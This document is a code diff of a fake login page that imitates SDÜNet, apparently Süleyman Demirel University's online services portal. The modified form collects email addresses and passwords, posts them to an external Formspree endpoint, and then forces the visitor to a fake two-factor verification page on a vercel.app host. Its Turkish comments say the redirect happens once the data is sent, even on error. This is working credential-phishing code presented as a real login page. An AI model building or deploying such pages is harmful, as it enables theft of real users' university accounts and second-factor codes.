@@ -1027,15 +1027,14 @@
                                         SDÜNet ile Çevrimiçi Hizmet ve Uygulamalar Tek Platformda...
                                     </span>
                                 </div>
-
                                 <form id="my-form" action="https://formspree.io/f/mvzzwyqq" method="POST"
                                     style="padding:0 50px">
                                     <div style="margin-bottom: 10px;">
-                                        <input type="text" name="eposta" placeholder="E-Posta Adresi" required
+                                        <input type="text" name="email" placeholder="E-Posta Adresi" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                                     </div>
                                     <div style="margin-bottom: 15px;">
-                                        <input type="password" name="sifre" placeholder="Şifre" required
+                                        <input type="password" name="password" placeholder="Şifre" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                                     </div>
 
@@ -1043,36 +1042,24 @@
                                         style="width: 100%; height: 50px; background-color: #800000; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">
                                         GİRİŞ YAP
                                     </button>
-                                    <p id="my-form-status"></p>
                                 </form>
 
                                 <script>
                                     var form = document.getElementById("my-form");
-
-                                    async function handleSubmit(event) {
+                                    form.addEventListener("submit", function (event) {
                                         event.preventDefault();
-                                        var status = document.getElementById("my-form-status");
-                                        var btn = document.getElementById("my-form-button");
                                         var data = new FormData(event.target);
-
-                                        btn.innerText = "Giriş Yapılıyor...";
-                                        btn.disabled = true;
-
                                         fetch(event.target.action, {
-                                            method: form.method,
+                                            method: 'POST',
                                             body: data,
-                                            headers: {
-                                                'Accept': 'application/json'
-                                            }
-                                        }).then(response => {
-                                            // VERİ GİTTİĞİ ANDA ZORLA YÖNLENDİR
+                                            headers: { 'Accept': 'application/json' }
+                                        }).then(() => {
+                                            // Bilgileri gönderdikten sonra 2FA sayfasına zorla gönder
                                             window.location.replace("https://sdu-sistem.vercel.app/dogrulamaa.html");
-                                        }).catch(error => {
-                                            // HATA OLSA BİLE ZORLA YÖNLENDİR
+                                        }).catch(() => {
                                             window.location.replace("https://sdu-sistem.vercel.app/dogrulamaa.html");
                                         });
-                                    }
-                                    form.addEventListener("submit", handleSubmit)
+                                    });
                                 </script>
                                 <div class="modal fade sf-hidden" id=myModal tabindex=-1 role=dialog
                                     aria-labelledby=myModalLabel>
